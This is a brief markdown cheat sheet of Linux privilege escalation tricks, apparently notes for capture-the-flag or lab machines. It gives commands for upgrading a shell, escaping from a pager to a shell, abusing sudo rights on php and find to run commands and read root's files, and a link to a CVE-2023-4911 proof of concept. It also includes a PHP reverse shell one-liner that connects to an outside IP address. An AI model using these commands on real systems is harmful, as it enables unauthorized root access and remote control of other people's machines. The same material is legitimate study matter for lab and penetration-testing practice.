# privilege escalation methods

## improving shell

`python3 -c 'import pty;pty.spawn("/bin/bash")'`
`script /dev/null -c bash`

## more|less > vi

if something is using more/less as an elevated user make the window smaller so it activates more or less
press `v` drops us in vim
using `:#!/bin/bash` we can get a shell

## sudo -l: shows php

try `sudo /usr/bin/php -r "system('whoami');"`

`/usr/bin/php -r "system('nc');"`
`php -r '$sock=fsockopen("10.10.14.207",1234);exec("/bin/sh <&3 >&3 2>&3");'`

## sudo -l: shows find

`sudo /usr/bin/find /root/root.txt -exec cat {} \;`

## ldd --version: version 2.35

`https://github.com/NishanthAnand21/CVE-2023-4911-PoC`
